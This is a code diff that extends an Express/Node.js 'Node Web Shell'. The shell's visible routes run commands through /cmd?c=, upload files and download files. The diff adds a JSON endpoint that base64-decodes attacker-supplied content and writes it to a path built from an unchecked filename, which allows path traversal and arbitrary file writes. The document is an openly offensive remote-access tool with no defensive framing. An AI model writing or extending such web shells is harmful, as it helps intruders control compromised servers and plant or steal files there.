@@ -15,11 +15,15 @@ if (!fs.existsSync(uploadDir)) {
 
 const upload = multer({ dest: uploadDir });
 
+// Add JSON body parser middleware
+app.use(express.json({ limit: '50mb' }));
+
 app.get('/', (req, res) => {
   res.send(`
     <h1>Node Web Shell</h1>
     <p>Run: <code>/cmd?c=whoami</code></p>
-    <p>Upload: POST to <code>/upload</code> (form field: "file")</p>
+    <p>Upload (form-data): POST to <code>/upload</code> (form field: "file")</p>
+    <p>Upload (JSON): POST to <code>/upload/json</code> with body: {"filename": "example.txt", "content": "base64string"}</p>
     <p>Download: <code>/download?f=filename</code></p>
   `);
 });
@@ -37,6 +41,24 @@ app.get('/cmd', (req, res) => {
 app.post('/upload', upload.single('file'), (req, res) => {
   if (!req.file) return res.send('No file uploaded.');
   res.send(`Uploaded: ${req.file.originalname} as ${req.file.filename}`);
+});
+
+// New endpoint for JSON upload
+app.post('/upload/json', (req, res) => {
+  const { filename, content } = req.body;
+  
+  if (!filename || !content) {
+    return res.status(400).send('Missing filename or content in JSON body');
+  }
+
+  try {
+    const filepath = path.join(uploadDir, filename);
+    const fileContent = Buffer.from(content, 'base64');
+    fs.writeFileSync(filepath, fileContent);
+    res.send(`Uploaded: ${filename}`);
+  } catch (error) {
+    res.status(500).send(`Error uploading file: ${error.message}`);
+  }
 });
 
 app.get('/download', (req, res) => {
